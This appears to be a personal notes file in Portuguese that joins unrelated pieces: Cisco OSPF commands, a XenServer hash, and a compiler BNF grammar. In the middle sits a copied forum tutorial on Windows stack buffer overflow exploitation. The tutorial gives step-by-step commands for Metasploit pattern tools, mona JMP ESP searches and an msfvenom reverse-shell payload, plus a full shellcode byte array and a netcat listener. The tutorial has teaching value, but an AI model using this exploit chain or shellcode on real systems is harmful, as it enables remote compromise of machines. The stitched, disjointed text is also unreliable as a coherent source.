
oi@oi oioi
carinha do ti = 2018716462569
seu jorge = 2018116455919

10331  10314


descobrir
router ?

router ospf 1
network 10.0.0.1 0.0.0.0 (pega exatamente o ip 10.0.0.1) area 0 (obrigatorio area 0)


router 2 
router ospf 1
network 10.0.0.0 0.0.0.3 (varia 2 bits) 

tem distancia administrativa

passive-interface g0/1 (tira a comunicação opsf de uma inteface)

passive-interface default (bloqueia tudo)
no passive-interface g0/1 (habilita)

so show ip int br
show ip ospf neighbors

clean ip ospf process

ip ospf dead-interval number * 3
ip ospf hello-interval number



POST FEITO POR Brandon Carter: Olá Bom Dia !!! Hoje irei falar um pouco sobre Buffer Overflow de uma maneira bem resumida. No entanto, caso queiram detalhes estarei deixando o link de dois ótimos videos falando sobre, e de livros também correlacionados.

1 = O atacante precisa saber exatamente aonde o estouro acontece, ou seja, até quantos dados a aplicação aguenta até literalmente travar. Neste caso o bom é utilizar um Fuzzer, para fins didádicos, assim vc consegue saber exatamente a quantidade de dados que ela aguenta após o estouro. Por exemplo, vamos supor que uma aplicação trave em 1100 bytes. Ou seja, vc sabe que a aplicação só aguenta os 1100 bytes correto ? OK porém aonde exatamente estamos sobrescrevendo o EIP ?

2 = Como temos que explorar o EIP para assim subir o endereço do JMP ESP, temos que saber exatamente até qual byte ANTERIOR irá começar a subscrever o EIP, em outras palavras, não é o byte que começa à subscrever EIP que queremos, e sim o 1 byte anterior à subscreção do mesmo. Pois assim, saberemos exatamente que a próxima coisa que colocarmos subscreverá o EIP. Portanto utilizaremos o Pattern_Create, uma ótima ferramenta do metasploit que irá nos mostra qual será esse byte anterior a subscreção do EIP. No entanto, irei dá um exemplo para que a coisa não fique vaga.Por exemplo vamos supor que nossa aplicação trave em 1100 ok ? Logo iremos no Pattern_Create e colocaremos esses 1100 bytes dessa forma:

root@debian:/home/brandon#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 1100

2.1 = Que irá gerar uma codificação gigante com 1100 bytes de dados exatamente. Agora com esses dados em mãos iremos mandar para aplicação que queremos, com isso gerará um novo endereçamento no EIP, com este endereçamento em mãos, iremos para o Pattern_Offset, para saber exatamente qual é o valor que expliquei logo acima.

root@debian:/home/brandon#usr/share/metasploit-framework/tools/exploit/pattern_offset.rb "[Aqui o endereço EIP gerado]"

[*] Exact match at offset 485 <--- Claro que esse número será diferente para cada aplicação.

Atenção: Caso queiram entender como os scripts Pattern_Create e o Pattern_Offset funcionam é só olhar em seu fonte ok ? Mas a lógica é simples, ele manda os dados, gera-se um endereço EIP e logicamente nesse endereço gerado é exatamente o valor que expliquei logo acima.

3 = Para que tenha certeza que conseguiu controlar o EIP envie para aplicação os "485" ou o valor que vc encontrou através do Pattern_Offset e em seguida envie pelo menos 4 bytes à mais para ver o que acontece. Geralmente o pessoal adorar brincar com o alfabeto A, B e C como estará no video que irei disponibilizar. Então vamos tomar, este, como exemplo. Temos um script Python que só irei usar uma pequena parte do código para a explicação OK ?

buf = "A" * 485 + "B" * 4 + "C" * 611 <-- Onde A + B + C = 1100 bytes

3.1 = Lembrando que o Hexadecimal de "A" seria "X41" correto ? E o "B" o mesmo "X42" correto ? Portanto esse é o motivo de enviar somente 4 bytes para "B" pois estes 4 bytes em hexadecimal ficará dessa forma "/X42/X42/X42/X42" Bom, é só pensar um pouco, afinal é bem parecido com a mesma quantidade de dados utilizados pelos endereçamentos como EIP, ESP, EBP etc...

4 = Bad Char, estes "bad char" são comandos em hexadecimal que não são reconhecidos pela aplicação, ou seja, se seu ShellCode tiver algum desses parâmetros em hexadecimal a aplicação não irá entender o seu ShellCode, consequentemente, não o executando corretamente e não abrindo o querido Shell Reverse. Então é interessante atentar-se para isso. Irei deixar um Link logo abaixo de um exploit em python com um exemplo de uma bad char.

https://www.exploit-db.com/exploits/40832/

5 = O próximo passo é achar um endereço JMP ESP para que consigamos pular para nossa ShellCode. Neste caso podemos utilizar uma DLL por exemplo do Windows. Seja Kernel32.dll ou Shell32.dll ou qualquer outra dll onde consigamos pular para o JMP ESP(\XFF\XE4). Enfim o que precisa é tentar encontrar um endereço JMP ESP.

Um comando interessante no Immunity Debugger seria =

mona find -s "\Xff\Xe4" -m kernel32.dll
ou
mona find -s "\Xff\Xe4" -m shell32.dll
ou
mona find -s "\Xff\Xe4" -m "[qualquer.dll]"

Onde: "\Xff\xe4" = É somente uma outra atribuição ao JMP ESP só que em Hexadecimal.

Caso queira mais detalhes sobre o immunity debbuger é só procurar na internet. Documentações tem aos montes tanto do Immunity como de outros disasembler. Portanto, deixarei um link aqui de outro site que não utiliza nem o Kernel32 tão menos o Shell32, logo abaixo.

Atenção: A DLL usada foi WMVCore.dll com endereço 1511EDFF.

https://www.rcesecurity.com/…/buffer-overflow-a-real-world…/

6 = Faça o teste para saber se o endereço JMP ESP está direcionando para os "C" ficando dessa forma.

buf = "A" * 485 + [Endereço JMP ESP] + "C" * 611

Depois de executado o script, verá que o endereço do EIP está mudado, ou seja, é o novo endereço que colocamos, levando como padrão a DLL usada. Ou seja, conseguimos controlar o EIP para apontar para nossa ShellCode em ESP. Que nesse caso são os nossos "C".

7 = É a hora de criar-mos a nossa ShellCode comando básico usado:

root@debian:/home/brandon#msvenom -p /windows/shell_reverse_TCP LHOST= X.X.X.X LPORT XXXXX -b [Bad Char] -f [saída do código pode ser Pyhton, Ruby etc]

Atenção: Veja o tamanho da ShellCode para que consigamos saber a quantidade de NOP (X90) que precisaremos para colocar antes da ShellCode. A questão do NOP (X90) é bem simples, precisaremos colocar alguns caracteres que não serão processados, ou seja, só para limpar o caminho para que a nossa ShellCode possa ser executada sem nenhum byte a mais de outros dados da aplicação vigente. Portanto ficaria assim:

buf = ""
buf += "\xdb\xdc\xb8\x95\x49\x89\x1d\xd9\x74\x24\xf4\x5f\x33"
buf += "\xc9\xb1\x47\x31\x47\x18\x83\xc7\x04\x03\x47\x81\xab"
buf += "\x7c\xe1\x41\xa9\x7f\x1a\x91\xce\xf6\xff\xa0\xce\x6d"
buf += "\x8b\x92\xfe\xe6\xd9\x1e\x74\xaa\xc9\x95\xf8\x63\xfd"
buf += "\x1e\xb6\x55\x30\x9f\xeb\xa6\x53\x23\xf6\xfa\xb3\x1a"
buf += "\x39\x0f\xb5\x5b\x24\xe2\xe7\x34\x22\x51\x18\x31\x7e"
buf += "\x6a\x93\x09\x6e\xea\x40\xd9\x91\xdb\xd6\x52\xc8\xfb"
buf += "\xd9\xb7\x60\xb2\xc1\xd4\x4d\x0c\x79\x2e\x39\x8f\xab"
buf += "\x7f\xc2\x3c\x92\xb0\x31\x3c\xd2\x76\xaa\x4b\x2a\x85"
buf += "\x57\x4c\xe9\xf4\x83\xd9\xea\x5e\x47\x79\xd7\x5f\x84"
buf += "\x1c\x9c\x53\x61\x6a\xfa\x77\x74\xbf\x70\x83\xfd\x3e"
buf += "\x57\x02\x45\x65\x73\x4f\x1d\x04\x22\x35\xf0\x39\x34"
buf += "\x96\xad\x9f\x3e\x3a\xb9\xad\x1c\x52\x0e\x9c\x9e\xa2"
buf += "\x18\x97\xed\x90\x87\x03\x7a\x98\x40\x8a\x7d\xdf\x7a"
buf += "\x6a\x11\x1e\x85\x8b\x3b\xe4\xd1\xdb\x53\xcd\x59\xb0"
buf += "\xa3\xf2\x8f\x2d\xa1\x64\xf0\x1a\xd2\xf2\x98\x58\x25"
buf += "\xeb\x04\xd4\xc3\x5b\xe5\xb6\x5b\x1b\x55\x77\x0c\xf3"
buf += "\xbf\x78\x73\xe3\xbf\x52\x1c\x89\x2f\x0b\x74\x25\xc9"
buf += "\x16\x0e\xd4\x16\x8d\x6a\xd6\x9d\x22\x8a\x98\x55\x4e"
buf += "\x98\x4c\x96\x05\xc2\xda\xa9\xb3\x69\xe2\x3f\x38\x38"
buf += "\xb5\xd7\x42\x1d\xf1\x77\xbc\x48\x8a\xbe\x28\x33\xe4"
buf += "\xbe\xbc\xb3\xf4\xe8\xd6\xb3\x9c\x4c\x83\xe7\xb9\x92"
buf += "\x1e\x94\x12\x07\xa1\xcd\xc7\x80\xc9\xf3\x3e\xe6\x55"
buf += "\x0b\x15\xf6\xaa\xda\x53\x8c\xc2\xde"

buffer = "A" * 485 + [Endereço JMP ESP] + X90 * [Quantidade NOP]

8 = Execute o netcat para ouvir na porta especifica. Por exemplo:

nc -p [porta] -l X.X.X.X

9 = Depois é só enviar para a aplicação. Abrindo assim um ShellReverse no Netcat. Lembrando que não muda muito para outros exploits pela internet,é claro que, pode ter algumas coisinhas a mais ou não. Porém a base é essa.

Videos:

https://www.youtube.com/watch?v=H2ZTTQX-ma4

https://www.youtube.com/watch?v=59_gjX2HxyA&t=15s

Meu link Google Drive = https://drive.google.com/open…





xen server
SHA-256 - 31ff88de89eea5be5e5afbb92ee25f493fd144b6e3abc90c3256d81dbe3c7dc9





















//PROGRAMA INICIA COM UMA FUNCAO 
<__FUNCTION__> ::= <__FUNCTION__> <TYPE> variable "(" <PARAMS_TYPE> ")" "{" <CMD_LIST> "}" | î;

<TYPE> ::= int | float | string | char | byte | unsigned | long | bool | void;

//PARAMENTROS (ISSO É PARA INICIAR FUNCOES) 
<PARAMS_TYPE> ::= <PARAMS> | <PARAMS_TYPE> <LAMBDA> | î;
<PARAMS> ::= <TYPE> variable <PARAMS_PLUS>;
<PARAMS_PLUS> ::=  <PARAMS_PLUS> "," <TYPE> variable | <PARAMS_PLUS> "," <LAMBDA> | î;
//lambda retorna qualquer <TYPE>, é pra ser generico mesmo
<LAMBDA> ::= "(" <PARAMS_TYPE> ")" "=>" "{" <CMD_LIST> "}";

//CORPO DA FUNCAO
<CMD_LIST> ::= <CMD_LIST> <VARIABLE_DECLARATION> | <CMD_LIST> <REPEAT_LOOP> | <CMD_LIST> <IF> | <CMD_LIST_2>;
<CMD_LIST_2> ::=  <CMD_LIST> <DATA_ENTRY> | <CMD_LIST> <ASSIGN> | return <exp> ";" |î;

//BLOCOS DE INSTRUCAO
<ASSIGN> ::= <ID_TYPES> "=" <exp> ";";

//DECLARACAO DE VARIAVEL
<VARIABLE_DECLARATION> ::= <TYPE> <VAR_LIST> ";";
<VAR_LIST> ::= <VAR_LIST> "," <ID_TYPES> | <ID_TYPES>; //| <ASSIGN> | <VAR_LIST><ASSING>;
<ID_TYPES> ::= variable | variable "[" <exp> "]";

//LACOS DE REPETICOES
<REPEAT_LOOP> ::= <DO_LOOP> | <FOR_LOOP> | <WHILE_LOOP>;
<DO_LOOP> ::= do "{" <CMD_LIST> "}" "(" <exp> ")";
<FOR_LOOP> ::= for "(" <exp> ")" "{" <CMD_LIST> "}";
<WHILE_LOOP> ::= while "(" <exp> ")" "{" <CMD_LIST> "}";

//IF
<IF> ::= if "(" <exp> ")" "{" <CMD_LIST> "}" <ELSE_IF> <ELSE>;
<ELSE_IF> ::= <ELSE_IF> else_if "(" <exp> ")" "{" <CMD_LIST> "}" | î;
<ELSE> ::= "{" <CMD_LIST> "}" | î;

//LEITURA E ESCRITA
<DATA_ENTRY> ::= <READ> | <WRITE> | î;
<READ> ::= put "(" <ID_TYPES> ")" ";";
<WRITE> ::= echo "(" <ID_TYPES> ")" ";";

//CODIGO DO PROFESSOR
<exp>  ::= <exp> "||" <exp1> | <exp1>;
<exp1> ::= <exp1> "&&" <exp2> | <exp2>;
<exp2> ::= <exp2> "|" <exp3> | <exp3>;
<exp3> ::= <exp3> "^" <exp4> | <exp4>;
<exp4> ::= <exp4> "&" <exp5> | <exp5>;
<exp5> ::= <exp5> <op_rel> <exp6> | <exp6>;
<exp6> ::= <exp6> <op_bitwise> <exp7> | <exp7>;
<exp7> ::= <exp7> <op_arit_baixa> <exp8> | <exp8>;
<exp8> ::= <exp8> <op_arit_alta> <exp9> | <exp9> ;
<exp9> ::= <op_neg> <exp10> | <exp10>;
<exp10> ::= numbers | number_float | variable | "(" <exp> ")" | variable "(" <exp> ")" | variable "["<exp>"]";

<op_rel> ::= ">" | "<" | ">=" | "<=" | "=" | "!="; 
<op_neg> ::= "-" | "~" | "!";
<op_bitwise> ::= "<<" | ">>";
<op_arit_baixa> ::= "+" | "-";
<op_arit_alta> ::= "*" | "/" | "%";

//Exemplo com tudo para ser usado no simulador
// -x + 8.8 - !x * 2 / ~y % 3 << 7 != y >> 3 || (x <= 3 && y > 8) | p & (h ^ g)
//TERMINO DO CODIGO DO PROFESSOR

